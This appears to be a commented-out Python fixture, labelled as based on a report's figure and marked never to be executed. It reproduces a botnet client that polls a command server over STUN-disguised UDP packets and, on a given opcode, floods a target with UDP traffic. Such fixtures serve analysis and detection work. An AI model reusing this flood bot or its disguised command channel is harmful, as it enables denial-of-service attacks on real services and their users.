# import socket
# import struct
# import time
# 
# # Static fixture inspired by the report's Figure 13; never execute.
# channel = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# request = struct.pack("!HHI12s", 1, 0, 0x2112a442, b"\x00" * 12)
# while True:
#     channel.sendto(request, ("192.0.2.42", 3478))
#     packet, peer = channel.recvfrom(2048)
#     message_type, size, cookie = struct.unpack("!HHI", packet[:8])
#     if message_type != 0x0101 or cookie != 0x2112a442:
#         continue
#     opcode, method, address, port, duration = struct.unpack("!BB4sHB3x", packet[8:20])
#     if opcode == 8 and method == 0:
#         target = (socket.inet_ntoa(address), port)
#         stop = time.monotonic() + duration
#         while time.monotonic() < stop:
#             channel.sendto(b"a" * 1000, target)
#     time.sleep(5)
